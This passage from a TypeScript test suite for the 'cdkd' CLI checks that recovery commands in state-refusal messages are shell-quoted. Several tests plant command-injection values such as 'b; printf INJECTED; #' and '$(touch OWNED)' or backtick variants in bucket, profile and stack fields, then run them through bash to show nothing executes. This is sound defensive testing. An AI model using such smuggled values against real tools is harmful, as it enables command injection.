        expect(inspectOf(text), JSON.stringify(name)).toBe(
          'cdkd state show \'<stack>\' --stack-region us-east-1 --json --profile prod --state-bucket b'
        );
        expect(text, JSON.stringify(name)).not.toContain('cdkd state show prod-api');
        // And it agrees with the drop command in the same message.
        expect(dropOf(text), JSON.stringify(name)).toBe(
          'cdkd state orphan \'<stack>\' --stack-region us-east-1 --profile prod --state-bucket b'
        );
      }
      // Region altered: both are holes, as in the drop command.
      const padded = malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1 ', ['A']);
      expect(inspectOf(padded)).toBe('cdkd state show \'<stack>\' --stack-region \'<region>\' --json');
      expect(dropOf(padded)).toBe('cdkd state orphan \'<stack>\' --stack-region \'<region>\'');
    });

    it("renders an EMPTY region exactly as an absent one — the WHOLE message, not one clause", () => {
      // What this pins is the builder's ENTRY normalisation: without it `''`
      // reaches `orphanInspectClause` as a region, which then prints a
      // `cdkd state show` template where the object path belongs. Compared as
      // whole messages so no clause can drift alone. The `''` floors inside
      // `dropRecordCommand` and `withheldIdentityClause` are unreachable through
      // the builder and are not what this case pins.
      const recovery = { profile: 'prod', stateBucket: 'b', statePrefix: 'custom' };
      for (const name of ['S', 'prod-api ', undefined]) {
        expect(
          malformedOrphanResourcePropertiesRefusalMessage(name, '', ['A'], recovery),
          JSON.stringify(name)
        ).toBe(malformedOrphanResourcePropertiesRefusalMessage(name, undefined, ['A'], recovery));
      }
      expect(
        lineValue(malformedOrphanResourcePropertiesRefusalMessage('S', '', ['A']), 'Object key')
      ).toBe("'<prefix>/S/state.json'");
    });

    it("keeps the `''` region AND stack-name floors in both helpers that read them (structural)", () => {
      // Unreachable through the builder, which normalises `''` at entry, so no
      // rendered message can observe it; kept so a later direct caller inherits
      // it (the reason `dropRecordCommand` records, m5 of go-to-k/cdkd#3363's
      // review). A source fence is the only thing that can hold it in place.
      const src = code('src/state/malformed-resources-bag.ts');
      for (const fn of ['function dropRecordCommand(', 'function identityWithheld(']) {
        const at = src.indexOf(fn);
        expect(at, `${fn} was renamed; this fence reads nothing`).toBeGreaterThan(-1);
        const body = src.slice(at, src.indexOf('\n}\n', at));
        expect(body, `${fn} no longer floors an empty region to absent`).toMatch(
          /region === '' \? undefined/
        );
        // And an empty STACK NAME, so the two cannot disagree about whether an
        // identity was supplied at all (m12 of the same review).
        // The GUARD STATEMENT itself, not a mention: a contrived no-op such as
        // `(stackName === '' && false)` would satisfy a substring check.
        expect(body, `${fn} no longer floors an empty stack name`).toMatch(
          /if \(stackName === undefined \|\| stackName === ''\) (return |\{)/
        );
      }
      // `orphanInspectClause` carries the STACK floor too, and only that one —
      // it branches on `region !== undefined` rather than normalising a `''`
      // region, so it is asserted here instead of in the loop above.
      //
      // It has to be a SOURCE fence for the same reason the two above do, and
      // go-to-k/cdkd#3439 first got this wrong: a rendered-message case cannot
      // reach the floor, because the one builder that calls this normalises
      // `''` at entry. Such a case passes on a tree WITHOUT the floor — measured
      // against `origin/main`, where all 24 empty/undefined-stack arms render
      // byte-identically — so it reads as covering the guard while covering
      // nothing. That is this PR's own subject, reproduced inside it.
      const clause = src.slice(
        src.indexOf('function orphanInspectClause('),
        src.indexOf('\n}\n', src.indexOf('function orphanInspectClause('))
      );
      expect(clause, 'orphanInspectClause was renamed; this fence reads nothing').not.toBe('');
      expect(clause, 'orphanInspectClause no longer floors an empty stack name').toMatch(
        /if \(stackName === undefined \|\| stackName === ''\) (return |\{)/
      );
    });

    it('prints an ALTERED account fragment as a hole, never as its sanitized text and never omitted', () => {
      // `recoveryCommandFlags` applies go-to-k/cdkd#3377's sanitize + exactness
      // pair to each fragment. `buildForceUnlockCommand` suppresses on an
      // inexact one; this refusal prints the hole instead, because omitting
      // the flag would resolve the ambient DEFAULT account and the sanitized
      // text names a different one.
      const esc = '\u001b[31m';
      const text = malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['A'], {
        profile: `prod${esc}`,
        stateBucket: `bucket${esc}`,
        statePrefix: `pre${esc}`,
      });
      expect(dropOf(text)).toBe(
        'cdkd state orphan S --profile \'<profile>\' --state-bucket \'<bucket>\' --state-prefix \'<prefix>\''
      );
      // The identity itself rendered exactly, so there is no identity hint.
      expect(text).not.toContain(HINT);
      // The object line names neither the altered bucket nor the altered
      // prefix, and does not claim the prefix is the default.
      expect(lineValue(text, 'Object key')).toBe("'<prefix>/S/state.json'");
      expect(lineValue(text, 'State bucket')).toBeUndefined();
      expect(text).toContain("in the state bucket ('cdkd state info' names it).");
      expect(text).not.toContain('\u001b');
      // A fragment that sanitizes to NOTHING is the shape where omitting and
      // holing diverge — its sanitized text is empty, so a rule keyed on the
      // text alone would drop the flag. One case per fragment, independently.
      for (const [field, hole] of [
        ['profile', '--profile \'<profile>\''],
        ['stateBucket', '--state-bucket \'<bucket>\''],
      ] as const) {
        for (const empty of [' ', '\u001b']) {
          const t = malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['A'], {
            [field]: empty,
          });
          expect(dropOf(t), `${field}=${JSON.stringify(empty)}`).toBe(`cdkd state orphan S ${hole}`);
        }
      }
      // A region-keyed record's inspect line takes the same holes.
      const keyed = malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1', ['A'], {
        profile: `prod${esc}`,
      });
      expect(keyed).toContain(
        'Inspect the record: cdkd state show S --stack-region us-east-1 --json --profile \'<profile>\''
      );
    });

    it('prints every command LAST and UNWRAPPED, so no quoted value can break out of a prose quote', () => {
      // Measured before this: the drop command sat inside the prose's '...', and
      // pasting that span WITH its quotes turned `shellQuote`'s own quoting
      // inside out — `'cdkd state orphan S --state-bucket 'b; printf X; #''`
      // ran `printf X` in bash. The bucket is plantable from a cloned repo's
      // `cdk.json`. Now each command is a trailing line of its own.
      const hostile = "b; printf INJECTED; #";
      const recovery = { stateBucket: hostile, statePrefix: 'cdkd' };
      for (const [name, region, labels] of [
        ['S', 'us-east-1', ['Drop the record', 'Inspect the record']],
        ['S ', 'us-east-1', ['Drop the record', 'Find the exact name', 'Inspect the record']],
        // The legacy region-less arm: no command can inspect it (the prose names
        // the object instead), and a withheld name still gets its listing line —
        // without it the drop command's name hole has nothing to fill it from.
        // Its LOCATION rides on labelled lines too, never inside the sentence (B1
        // of the fourth review): the key only when the name renders exactly.
        ['S', undefined, ['Drop the record', 'Object key', 'State bucket']],
        ['S ', undefined, ['Drop the record', 'Find the exact name', 'State bucket']],
      ] as const) {
        const text = malformedOrphanResourcePropertiesRefusalMessage(name, region, ['A'], recovery);
        const lines = text.split('\n');
        // Exactly these labelled command lines, in order — an empty set would
        // otherwise satisfy every check below.
        expect(lines.slice(1).map((l) => l.slice(0, l.indexOf(': '))), JSON.stringify(name)).toEqual([
          ...labels,
        ]);
        // Each command carries the hostile bucket as ONE quoted argument, at its
        // end; the location lines carry exactly one quoted value each.
        for (const line of lines.slice(1)) {
          if (line.startsWith('State bucket: ')) {
            expect(line).toBe(`State bucket: 'b; printf INJECTED; #'`);
          } else if (line.startsWith('Object key: ')) {
            expect(line).toBe('Object key: cdkd/S/state.json');
          } else {
            expect(line.endsWith(`--state-bucket 'b; printf INJECTED; #'`), line).toBe(true);
          }
        }
      }
      // And across EVERY arm (exact, withheld, legacy object path, no identity)
      // the prose line carries no pasteable command at all — only fixed command
      // NAMES such as 'cdkd orphan', which interpolate nothing.
      // Run every arm WITH a recovery context and WITHOUT one. The second pass
      // is what exercises the fill-in note, which is the only prose in this
      // message that names a flag at all — so with a context alone the
      // invariant below was true of a subset of arms while reading as true of
      // all of them (go-to-k/cdkd#3439).
      for (const context of [recovery, undefined]) {
        for (const [name, region] of [
          ['S', 'us-east-1'],
          ['S ', 'us-east-1'],
          ['S', undefined],
          ['S ', undefined],
          [undefined, undefined],
        ] as const) {
          const label = `${String(name)}/${String(region)}/${context === undefined ? 'bare' : 'recovery'}`;
          const prose = malformedOrphanResourcePropertiesRefusalMessage(
            name,
            region,
            ['A'],
            context
          ).split('\n')[0]!;
          expect(prose, label).not.toMatch(/cdkd state (orphan|show|list) /);
          // By PROPERTY as well as by verb: no value-carrying flag in the prose,
          // whatever command it would belong to (m11 of the same review). A flag
          // NAME may be mentioned — the fill-in note does — but only QUOTED, so
          // the space after it belongs to the closing quote and never to a value.
          expect(prose, label).not.toMatch(/--(state-bucket|profile|state-prefix|stack-region) /);
          // No VALUE in the prose at all: the legacy arm's bucket moved to its own
          // line, because a quoted value inside English is only as safe as the
          // apostrophes before it (B1 of the fourth review).
          expect(prose, label).not.toContain('printf');
        }
      }
    });

    /**
     * M4 of go-to-k/cdkd#3363's review, measured the way it was found: every
     * command line with a HOLE is pasted into bash for real, under a stub
     * `cdkd` that prints its argv, in a scratch directory holding files named
     * after every hole. A bare `<profile>` is two redirections there — it reads
     * `profile` as stdin and sends stdout into the next word, which swallowed
     * `--state-bucket` and ran the delete against the ambient bucket — so bash's
     * argv would differ from the quote-aware split below and a file would
     * appear. Quoted holes arrive as literal arguments.
     */
    it('pastes every hole-bearing command as literal arguments — no redirection, no file created', () => {
      const words = (line: string): string[] => {
        const out: string[] = [];
        let cur = '';
        let inWord = false;
        for (let i = 0; i < line.length; i++) {
          const c = line[i]!;
          if (c === "'") {
            const end = line.indexOf("'", i + 1);
            cur += line.slice(i + 1, end);
            i = end;
            inWord = true;
          } else if (c === '\\') {
            cur += line[++i] ?? '';
            inWord = true;
          } else if (c === ' ') {
            if (inWord) out.push(cur);
            cur = '';
            inWord = false;
          } else {
            cur += c;
            inWord = true;
          }
        }
        if (inWord) out.push(cur);
        return out;
      };
      const recovery = { profile: 'prod', stateBucket: 'realbucket', statePrefix: 'custom' };
      const altered = { profile: 'prod\u001b', stateBucket: 'b\u001b', statePrefix: 'p\u001b' };
      const messages = [
        malformedOrphanResourcePropertiesRefusalMessage(undefined, undefined, ['A'], recovery),
        malformedOrphanResourcePropertiesRefusalMessage('S ', undefined, ['A'], recovery),
        malformedOrphanResourcePropertiesRefusalMessage('S ', 'us-east-1', ['A'], recovery),
        malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1 ', ['A'], recovery),
        malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1', ['A'], altered),
        malformedOrphanResourcePropertiesRefusalMessage('S', undefined, ['A'], altered),
      ];
      const lines = messages
        .flatMap((m) => m.split('\n').slice(1))
        // Command lines only: the location lines carry a value, not a command.
        .filter((l) => /^(Drop the record|Find the exact name|Inspect the record): /.test(l))
        .map((l) => l.slice(l.indexOf(': ') + 2))
        // Matched with or without quotes, so a regression to bare holes is still
        // SELECTED here and then caught by bash below rather than filtered out.
        .filter((l) => /<(stack|region|profile|bucket|prefix)>/.test(l));
      // Every shape above prints at least one hole, so an empty set means the
      // extraction broke, not that the property holds.
      expect(lines.length).toBeGreaterThanOrEqual(messages.length);
      const dir = mkdtempSync(join(tmpdir(), 'cdkd-hole-paste-'));
      try {
        for (const f of ['stack', 'region', 'profile', 'bucket', 'prefix']) {
          writeFileSync(join(dir, f), 'decoy\n');
        }
        const before = readdirSync(dir).sort();
        for (const line of lines) {
          const r = spawnSync('bash', ['-c', `cdkd() { printf '%s\\n' "$@"; }; ${line}`], {
            cwd: dir,
            encoding: 'utf8',
          });
          expect(r.status, `${line}\n${r.stderr}`).toBe(0);
          expect(r.stdout.split('\n').slice(0, -1), line).toEqual(words(line).slice(1));
          expect(readdirSync(dir).sort(), line).toEqual(before);
        }
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    }, 30_000);

    /**
     * B1 of go-to-k/cdkd#3363's fourth review, as a class rather than one
     * apostrophe: EVERY piece of the message an operator might paste — each
     * line, each prose sentence, each clause of one — is run through real bash
     * with hostile values in the slots named below, and neither a sentinel nor
     * a changed directory may result. Whole prose lines alone would pass
     * vacuously: `record(s)` is a syntax error, so bash runs nothing on that
     * line whatever it holds. Sentences and clauses are what an operator
     * selects.
     *
     * **The slots are the stack name, the region and the three recovery
     * fragments — NOT `logicalIds`, and that exclusion is load-bearing rather
     * than an oversight.** Ids reach the prose through `displayIdent`, whose
     * boundary is a JSON string, and DOUBLE quotes do not neutralise a
     * backtick: an id `` L`touch OWNED` `` renders ``"L`touch OWNED`"`` and
     * runs when its clause is pasted (measured). That is live on `origin/main`
     * too, and the fix is not local — `namedPropertyBagsClause` is shared with
     * two sibling builders, hard single quotes break out on an id carrying
     * `'`, and the correct shape is the one repo-wide helper
     * go-to-k/cdkd#3436 proposes. Injecting ids here would redden this test
     * against a defect this module cannot fix alone, so the slot is named,
     * measured and tracked there instead of silently omitted.
     */
    it('runs NO value from any pasted line, sentence or clause of the message', () => {
      const payload = 'touch OWNED';
      // FOUR carrier shapes, not just `;` (go-to-k/cdkd#3439). A `;` payload
      // needs the quote context to be OPEN; `$( )` and a backtick run inside
      // DOUBLE quotes as well, and a `"` of its own can supply those — so an
      // alphabet of one shape answers a narrower question than the test claims.
      // All four are inert inside `'...'`, which is exactly why the fence has to
      // check the CONTEXT rather than the presence of quotes.
      const carriers = [
        (v: string) => `${v}; ${payload}; #`,
        (v: string) => `${v}$(${payload})`,
        (v: string) => `${v}\`${payload}\``,
        (v: string) => `${v}"; ${payload}; #`,
      ];
      const messages: string[] = [];
      const injected: string[] = [];
      for (const carry of carriers) {
        const recovery = {
          profile: carry('p'),
          stateBucket: carry('v'),
          statePrefix: carry('x'),
        };
        injected.push(recovery.profile, recovery.stateBucket, recovery.statePrefix);
        // Both an EXACT-rendering name and one with a trailing space, which
        // takes the withhold arm: the two print different sentences.
        // A fifth context whose PREFIX is inexact, so the arms that print a
        // HOLE render at all. Without it every fragment here is exact, the
        // hole-bearing sentences never appear, and the harness cannot see a
        // bare `<prefix>` in prose however many decoys it plants — measured,
        // that is how go-to-k/cdkd#3440's round-2 blocker reached a review.
        const holed = { ...recovery, statePrefix: `x\u001b[31m` };
        for (const ctx of [recovery, holed]) {
          for (const region of [undefined, 'us-east-1']) {
            messages.push(
              malformedOrphanResourcePropertiesRefusalMessage(carry('s'), region, ['A'], ctx)
            );
          }
        }
        for (const name of [carry('s'), `${carry('s')} `]) {
          injected.push(name);
          for (const region of [undefined, 'us-east-1', carry('r')]) {
            // Only the HOSTILE region joins `injected`. Measured impact is one
            // segment, so this is correctness rather than coverage: the
            // exemption set is defined as what the splitter makes out of a
            // PAYLOAD, and a benign region is not one.
            if (region !== undefined && region !== 'us-east-1') injected.push(region);
            messages.push(
              malformedOrphanResourcePropertiesRefusalMessage(name, region, ['A'], recovery)
            );
          }
        }
      }
      // A fragment lying wholly INSIDE one injected value is not an operator
      // selection — it is the splitter cutting up the payload itself, which
      // then "executes" no matter what the message does. Measured: splitting on
      // parentheses turns `$(touch OWNED)` into a bare `touch OWNED`, and a
      // fence that counted that would report a hit against a message that is
      // safe. What must stay in the population is every fragment SPANNING a
      // value and the prose around it, which is the shape B1 actually was.
      // What must be excluded is exactly what the SPLITTER manufactures out of
      // one value in isolation — nothing else. Splitting `s$(touch OWNED)` on
      // parens yields a bare `touch OWNED`, which "executes" whatever the
      // message does and is not a selection anyone could make.
      //
      // Two narrower spellings were tried and BOTH were fail-open, each in a
      // way the other hides (go-to-k/cdkd#3440, rounds 1 and 2):
      //
      // - "contained in a value" also drops a fragment that IS a value, and
      //   that is the dangerous shape. A regression rendering the bucket RAW in
      //   a parenthetical gives a clause EQUAL to the value, while the
      //   enclosing line and sentence both abort on bash's unbalanced `(` — so
      //   the clause split is the only granularity that sees it. Measured: 0
      //   hits, i.e. green on an exploitable message.
      // - "contained, but not equal" fixes that one and still exempts every
      //   value rendered through `displaySafe` / `displayIdent`, because both
      //   TRIM: the spelling the module PRINTS is a proper substring of the
      //   value injected. A regression printing the SANITIZED name raw measured
      //   0 hits under it too.
      //
      // Deriving the exemption from the splitter closes both without a third
      // guess: HEAD 0, and 2-4 hits on each of the four regressions above.
      const splitterArtifacts = new Set(injected.flatMap((v) => v.split(/: | — |[()]/)));
      const insideOneValue = (seg: string): boolean => seg !== '' && splitterArtifacts.has(seg);
      const segments = new Set<string>();
      for (const m of messages) {
        for (const line of m.split('\n')) {
          segments.add(line);
          for (const sentence of line.split(/(?<=[.!?])\s+/)) {
            segments.add(sentence);
            // Split on PARENTHESES too: an unbalanced `(` or `)` is a bash
            // syntax error that stops the fragment before anything in it runs,
            // so a value sitting after a parenthetical was exempt from this
            // fence entirely while reading as covered.
            for (const clause of sentence.split(/: | — |[()]/)) {
              if (!insideOneValue(clause)) segments.add(clause);
            }
          }
        }
      }
      // Guard the guard, and not by a floor the degenerate case clears. The
      // previous bound was `messages.length * 3`; with line-level splitting
      // ALONE the population already exceeded it, so both finer splits could
      // have become no-ops unnoticed — and line-level alone is exactly what was
      // measured vacuous against the bug this test exists for. Anchor on the
      // finest granularity instead: a bare clause with no terminator, which
      // only the clause split can produce.
      expect(segments.size).toBeGreaterThan(150);
      expect(
        [...segments].filter((s) => s !== '' && !/[.\n]/.test(s)).length,
        'the clause split degenerated'
      ).toBeGreaterThan(60);
      // And the PAREN split specifically, which neither floor above can see:
      // both are cleared by line+sentence alone, so reverting `[()]` from the
      // clause regex left this test green while removing the only granularity
      // that reaches a value behind a parenthetical — an unbalanced `(` aborts
      // the enclosing line and sentence before bash gets to it. Every
      // parenthetical's INTERIOR must therefore be a segment in its own right.
      const interiors = messages.flatMap((m) =>
        [...m.matchAll(/\(([^()]+)\)/g)].map((match) => match[1]!)
      );
      expect(interiors.length, 'no parenthetical to check the split against').toBeGreaterThan(0);
      for (const interior of interiors) {
        // Skipping what the filter above legitimately drops — a parenthetical
        // whose whole interior sits inside one injected value is the payload's
        // own interior, not a selection.
        if (insideOneValue(interior)) continue;
        expect(segments.has(interior), `the paren split missed ${JSON.stringify(interior)}`).toBe(
          true
        );
      }
      const dir = mkdtempSync(join(tmpdir(), 'cdkd-prose-paste-'));
      try {
        // DECOYS and a directory snapshot, not just the sentinel. Asserting
        // only `OWNED` watches for EXECUTION and is blind to REDIRECTION, and
        // prose carries holes too: a bare `<prefix>` in a sentence reads
        // stdin from a file named `prefix` and truncates whatever word follows
        // — measured, it created a file called `where` (go-to-k/cdkd#3440
        // round 2). The command-line harness has planted these since
        // go-to-k/cdkd#3363's M4; this one had not, which is how that hole
        // reached a review.
        for (const f of ['stack', 'region', 'profile', 'bucket', 'prefix', 'json']) {
          writeFileSync(join(dir, f), 'decoy\n');
        }
        const before = readdirSync(dir).sort();
        for (const seg of segments) {
          spawnSync('bash', ['-c', `cdkd() { :; }; ${seg}`], { cwd: dir, encoding: 'utf8' });
          expect(readdirSync(dir).sort(), seg).toEqual(before);
        }
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    }, 60_000);

    it('qualifies the NO-IDENTITY templates too — the identity is the hole, not the account', () => {
      const recovery = { profile: 'prod', stateBucket: 'b', statePrefix: 'custom' };
      for (const name of [undefined, ''] as const) {
        const text = malformedOrphanResourcePropertiesRefusalMessage(name, undefined, ['A'], recovery);
        expect(dropOf(text), String(name)).toBe(
          'cdkd state orphan \'<stack>\' --stack-region \'<region>\' --profile prod --state-bucket b --state-prefix custom'
        );
        expect(text, String(name)).toContain(
          'Inspect the record: cdkd state show \'<stack>\' --stack-region \'<region>\' --json ' +
            '--profile prod --state-bucket b --state-prefix custom'
        );
      }
    });

    it('shell-quotes the inspect line and carries a non-default or EMPTY prefix on it', () => {
      const inspect = (name: string, region: string, prefix: string): string =>
        /^Inspect the record: (cdkd state show .*)$/m.exec(
          malformedOrphanResourcePropertiesRefusalMessage(name, region, ['A'], {
            stateBucket: 'b',
            statePrefix: prefix,
          })
        )![1]!;
      expect(inspect("It's Stack", "it's", 'custom')).toBe(
        "cdkd state show 'It'\\''s Stack' --stack-region 'it'\\''s' --json --state-bucket b --state-prefix custom"
      );
      expect(inspect('S', 'us-east-1', '')).toBe(
        "cdkd state show S --stack-region us-east-1 --json --state-bucket b --state-prefix ''"
      );
    });
  });

  it('does not claim a lock would be taken — one is already held when it raises', () => {
    // On a NON-dry run `src/cli/commands/orphan.ts` acquires the lock BEFORE
    // `getState`, so by the time this text renders a lock exists and the
    // command's own `finally` releases it (pinned in
    // `tests/unit/cli/orphan.test.ts`). The first revision said "Continuing
    // would take a lock", which tells the operator no lock was involved (code
    // review of go-to-k/cdkd#3318). Under `--dry-run` no lock is taken at all,
    // which the sentence is also true for — it simply promises nothing.
    const text = malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1', ['A']);
    expect(text).not.toContain('take a lock');
    expect(text).toContain('Continuing would rewrite, save, and report success');
  });

  it('names every surviving damaged record up to the cap, with a count', () => {
    // The `and N more` path through the SHARED clause, reached through THIS
    // builder: the loop below covers sanitizing and truncation but not the
    // multi-id rendering, and the orphan block's other cases are all N=1.
    const ids = Array.from({ length: 7 }, (_, i) => `Torn${i}`);
    const text = malformedOrphanResourcePropertiesRefusalMessage('S', 'us-east-1', ids);
    expect(text).toContain('holds 7 resource record(s)');
    expect(text).toContain('Torn4');
    expect(text).not.toContain('Torn5');
    expect(text).toContain('and 2 more');
  });
});

/**
 * The `properties` container's own source fence (issue
 * [go-to-k/cdkd#3191](https://github.com/go-to-k/cdkd/issues/3191)).
 *
 * DOMINANCE, not presence — the same shape, and the same reason, as the two
 * fences above. go-to-k/cdkd#3018's first cut was a POSITION error: twelve
 * `?? {}` guards each sitting one line BELOW the dereference they meant to
 * protect. A fence asserting only that the guard exists stays green through
 * exactly that, and this guard's whole placement argument is that ONE call at
 * `calculateDiff`'s entry dominates all five `currentResource.properties`
 * reads below it.
 */
describe('the properties-container guards dominate their reads (issue go-to-k/cdkd#3191)', () => {
  const CALCULATOR = 'src/analyzer/diff-calculator.ts';
  const DIFF_LOAD = 'src/cli/commands/diff-recursive.ts';

  it(`${CALCULATOR} REFUSES, above its first properties read`, () => {
    const src = code(CALCULATOR);
    const refusalAt = src.indexOf('refuseMalformedResourceProperties(');
    expect(
      refusalAt,
      `${CALCULATOR} no longer refuses an unreadable properties bag. Every cdkd deploy diff ` +
        `enters here, and an unreadable bag reads as a resource whose declared properties are ` +
        `all missing — a REPLACEMENT of the live resource for a create-only one.`
    ).toBeGreaterThan(-1);
    // The anchor is the first of the five reads: the type-change UPDATE's
    // record. A refusal below it leaves the wrong verdict computed one line
    // above the guard meant to prevent it.
    const derefAt = 'currentProperties: currentResource.properties';
    const derefIndex = src.indexOf(derefAt);
    expect(
      derefIndex,
      `${CALCULATOR} no longer contains its first properties read \`${derefAt}\`; this fence's ` +
        `anchor is stale and it is no longer checking dominance.`
    ).toBeGreaterThan(-1);
    expect(
      refusalAt,
      `${CALCULATOR} refuses AFTER its first \`currentResource.properties\` read, so the ` +
        `comparison it protects already ran — the exact shape go-to-k/cdkd#3018's first cut ` +
        `shipped.`
    ).toBeLessThan(derefIndex);
    // DOMINANCE has two more failure modes a single index compare cannot see,
    // and probe 9 only moved the call DOWN (review of go-to-k/cdkd#3191).
    //
    // (a) A read added ABOVE the guard. Anchoring on the FIRST read only says
    // the guard precedes THAT one, so assert the guard precedes EVERY
    // `currentResource.properties` read in the file.
    const everyRead = [...src.matchAll(/currentResource\.properties/g)].map((m) => m.index ?? -1);
    expect(everyRead.length, `${CALCULATOR} no longer reads currentResource.properties`).toBeGreaterThanOrEqual(5);
    expect(
      Math.min(...everyRead),
      `${CALCULATOR} reads \`currentResource.properties\` BEFORE the refusal. The anchor below ` +
        `is the first read as of go-to-k/cdkd#3191; a read added above the guard is the same ` +
        `defect one line earlier.`
    ).toBeGreaterThan(refusalAt);
    // (b) The guard wrapped in a condition. A refusal that only sometimes runs
    // is not a refusal; the call must sit at statement position.
    expect(
      src,
      `${CALCULATOR}'s refusal is no longer an unconditional statement — a guard behind an ` +
        `\`if\` runs on the caller's terms rather than on the record's.`
    ).toMatch(/\n\s*refuseMalformedResourceProperties\(/);
    // And it must pass NO identity: the only pair in reach is the record's own
    // unvalidated self-report, which would aim the remedy at another stack.
    expect(
      src,
      `${CALCULATOR} passes an identity to the refusal. The only one in reach is ` +
        `\`currentState.stackName\` / \`.region\`, fields of the record being declared ` +
        `malformed — a planted pair names a different, healthy stack.`
    ).toContain('refuseMalformedResourceProperties(currentState, undefined, undefined)');
    // And it must not take the read-only helper instead: this module is
    // reached by cdkd deploy, which provisions.
    expect(
      src.includes('repairMalformedResourcePropertiesForReadOnly'),
      `${CALCULATOR} repairs instead of refusing. Measured on this tree, a bag repaired to {} ` +
        `reaches the SAME requiresReplacement verdict as the torn one, so the repair ` +
        `reproduces the data loss rather than avoiding it.`
    ).toBe(false);
  });

  it(`${DIFF_LOAD} REPAIRS — cdkd diff persists nothing and must still report`, () => {
    const src = code(DIFF_LOAD);
    const repairAt = src.indexOf('repairMalformedResourcePropertiesForReadOnly(');
    expect(
      repairAt,
      `${DIFF_LOAD} no longer repairs an unreadable properties bag at the load, so cdkd diff ` +
        `inherits the calculator's refusal and stops reporting on the record a user runs it to ` +
        `inspect.`
    ).toBeGreaterThan(-1);
    // It must WARN, because an empty bag is indistinguishable from a resource
    // that genuinely declares nothing — a silent repair is its own defect.
    expect(
      src.includes('malformedResourcePropertiesWarning('),
      `${DIFF_LOAD} repairs silently; the preview it then prints is wrong in a way nothing says.`
    ).toBe(true);
    // AFTER the bag repair: an unreadable `resources` map has no entries to
    // walk, and the entry predicate deliberately returns [] for one.
    const bagRepairAt = src.indexOf('repairMalformedResourcesForReadOnly(');
    expect(
      bagRepairAt,
      `${DIFF_LOAD} no longer repairs the resources bag; this fence's anchor is stale.`
    ).toBeGreaterThan(-1);
    expect(
      bagRepairAt,
      `${DIFF_LOAD} repairs the properties bags BEFORE the resources bag, so a record damaged ` +
        `at the root walks no entries and the per-entry warning never fires.`
    ).toBeLessThan(repairAt);

    // A SECOND repair, after the rollback-orphan splice. `state.orphans` is a
    // container the load never walks, and `computeStackDiff` merges the
    // adopted records straight into the bag it hands the calculator — so one
    // repair at the load is NOT sufficient here, unlike for the two other
    // containers. Without it `cdkd diff` aborted with the deploy's refusal.
    const spliceAt = src.indexOf('...plan.adopted');
    expect(
      spliceAt,
      `${DIFF_LOAD} no longer splices adopted orphan records; this fence's anchor is stale.`
    ).toBeGreaterThan(-1);
    const secondRepairAt = src.indexOf('repairMalformedResourcePropertiesForReadOnly(', repairAt + 1);
    expect(
      secondRepairAt,
      `${DIFF_LOAD} repairs the properties bags only once. The rollback-orphan splice adds ` +
        `records from \`state.orphans[].state\`, which the load never walked, so a torn one ` +
        `reaches calculateDiff and ABORTS cdkd diff with the deploy's refusal.`
    ).toBeGreaterThan(spliceAt);
  });

  /**
   * The THIRD consumer of this container, and the one that WRITES (issue
   * [go-to-k/cdkd#3318](https://github.com/go-to-k/cdkd/issues/3318)).
   *
   * `cdkd orphan` neither diffs nor previews: it rewrites the surviving
   * records and saves them. `refuseMalformedState` above it answers a question
   * about the record ROOT only, and `unreadableResourcePropertyBags`
   * deliberately returns `[]` for a record whose root bag is unreadable — so
   * taking only that one leaves this container unguarded on a write path.
   */
  const ORPHAN = 'src/cli/commands/orphan.ts';

  it(`${ORPHAN} REFUSES, above the rewrite walk that persists the bag`, () => {
    const src = code(ORPHAN);
    const refusalAt = src.indexOf('refuseMalformedResourcePropertiesForOrphan(');
    expect(
      refusalAt,
      `${ORPHAN} no longer refuses an unreadable per-entry properties bag. \`rewriteValue\` ` +
        `returns a non-object VERBATIM and the result is re-assigned through a bare cast, so ` +
        `the record this command SAVES still carries the map it could not read.`
    ).toBeGreaterThan(-1);
    // DOMINANCE against the expression that carries the bag into the rewrite
    // — the same anchor this file's outputs fence uses for this command,
    // because it is the one call that reads every entry.
    const derefAt = 'rewriteResourceReferences(';
    const derefIndex = src.indexOf(derefAt);
    expect(
      derefIndex,
      `${ORPHAN} no longer contains \`${derefAt}\`; this fence's anchor is stale.`
    ).toBeGreaterThan(-1);
    expect(
      refusalAt,
      `${ORPHAN} refuses BELOW \`${derefAt}\`, so the rewrite that carries the unreadable bag ` +
        `into the saved record already ran — go-to-k/cdkd#3018's round-1 defect.`
    ).toBeLessThan(derefIndex);
    // It must sit at statement position: a refusal behind an `if` runs on the
    // caller's terms rather than on the record's.
    //
    // The regex ALONE does not say that, and the first revision of this fence
    // claimed it did — `/\n\s*refuseMalformed.../` matches equally when the
    // call sits on its own line INSIDE `if (!options.dryRun) {`, which is
    // precisely the gating it was written to refuse (code review of
    // go-to-k/cdkd#3318). It is kept as the cheap half and paired with the
    // dominance compare below, which the `if` form cannot satisfy.
    expect(
      src,
      `${ORPHAN}'s refusal is no longer an unconditional statement.`
    ).toMatch(/\n\s*refuseMalformedResourcePropertiesForOrphan\(/);
    // NOT WRAPPED IN A DRY-RUN CONDITIONAL. The dominance compare below is NOT
    // what catches that: an `if (!options.dryRun) { refuse... }` still sits
    // above the dry-run return, so it satisfies the compare while skipping the
    // refusal for exactly the mode the text says it covers (measured as a probe
    // on this fence's first revision, which claimed the compare caught it).
    //
    // The 200-character window is a CHEAP tripwire, not the guarantee: it
    // reaches back over part of the comment block above the call, so a wrapper
    // placed around comment AND call sits outside it. The real discriminator is
    // the runtime `--dry-run` case in `tests/unit/cli/orphan.test.ts`, which
    // asserts the refusal text and cannot survive any gating at all.
    expect(
      src.slice(Math.max(0, refusalAt - 200), refusalAt),
      `${ORPHAN}'s refusal is gated on a dry-run test. 'cdkd orphan --dry-run' would then print ` +
        `a rewrite audit table the real run refuses — the worst arm of all.`
    ).not.toContain('dryRun');
    // DOMINANCE over the dry-run return: a guard written BELOW it never runs
    // for a dry run at all.
    const dryRunAt = src.indexOf('if (options.dryRun)');
    expect(
      dryRunAt,
      `${ORPHAN} no longer contains its \`if (options.dryRun)\` return; this fence's anchor is stale.`
    ).toBeGreaterThan(-1);
    expect(
      refusalAt,
